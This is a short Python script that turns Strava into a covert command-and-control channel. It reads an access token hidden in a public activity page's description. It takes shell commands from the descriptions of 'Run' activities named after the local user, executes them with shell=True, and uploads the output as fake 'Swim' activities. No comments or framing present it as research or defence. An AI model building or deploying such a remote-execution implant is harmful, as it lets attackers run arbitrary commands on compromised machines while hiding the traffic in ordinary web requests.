import requests
from contextlib import suppress
import subprocess
import os
import re
from datetime import datetime, timedelta

MAIN_ACTIVITY = ""
ACCESS_TOKEN = ""
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
HEADERS = {
    'User-Agent': USER_AGENT,
    'Authorization': f"Bearer {ACCESS_TOKEN}",
    'Content-Type': 'application/json',
}

def recover_token(activity_id: int) -> str:
    response = requests.get(f"https://www.strava.com/activities/{activity_id}", headers=HEADERS)
    if match := re.search(r'property="og:description" content="([a-f0-9]{40})',str(response.content)):
        return match.group(1)
    else:
        return "" 


def get_activity(activity_id: int) -> requests.Response:
    response = requests.get(f"https://www.strava.com/api/v3/activities/{activity_id}", headers=HEADERS)
    return response


def get_activities()-> requests.Response:
    response = requests.get(f"https://www.strava.com/api/v3/activities", headers=HEADERS)
    return response

def post_activity(description: str, parent_act_id: int):
    json_data = {
        'commute': 0,
        'description': description,
        'distance': '3400',
        'elapsed_time': '1200',
        'name': f"{os.getlogin()}-{parent_act_id}",
        'sport_type': 'Swim',
        'start_date_local': (datetime.now() - timedelta(minutes=20)).isoformat(),
        'trainer': 0,
        'type': 'Swim',
    }

    response = requests.post('https://www.strava.com/api/v3/activities', headers=HEADERS, json=json_data)
    return response


if __name__ == "__main__":
    ACCESS_TOKEN = recover_token(MAIN_ACTIVITY)
    print(ACCESS_TOKEN)
    HEADERS = {
    'User-Agent': USER_AGENT,
    'Authorization': f"Bearer {ACCESS_TOKEN}",
    'Content-Type': 'application/json',
    }
    activities = get_activities().json()
    for _activity in activities:
        if (act_id := _activity.get("id",0)) and act_id != MAIN_ACTIVITY:
            activity = get_activity(act_id).json()
            command = activity.get("description","")
            if activity.get("type") == "Run" and activity.get("name","").startswith(os.getlogin()):
                with suppress(subprocess.CalledProcessError):
                    print(f"Running: {command}")
                    a = subprocess.run(command, shell=True, check=True, capture_output=True, encoding='utf-8')
                    b = post_activity(a.stdout, act_id)
                    print(f"Result uploaded! : {b.content}, {a.stdout}")
